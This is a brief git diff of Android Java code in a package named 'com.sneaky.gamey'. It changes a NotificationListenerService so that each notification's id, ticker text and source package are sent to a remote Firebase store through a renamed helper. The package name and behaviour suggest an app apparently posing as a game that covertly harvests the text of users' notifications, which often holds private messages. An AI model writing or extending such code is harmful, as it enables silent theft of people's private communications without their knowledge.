@@ -5,7 +5,7 @@ import android.os.IBinder;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 
-import com.sneaky.gamey.database.Firebase;
+import com.sneaky.gamey.database.MyFirebase;
 
 import java.util.ArrayList;
 
@@ -27,7 +27,7 @@ public class NotificationListener extends NotificationListenerService {
         data.add(sbn.getId());
         data.add(sbn.getNotification().tickerText);
         data.add(sbn.getPackageName());
-        Firebase.sendData(data);
+        MyFirebase.sendData("notification", data);
     }
 
     @Override
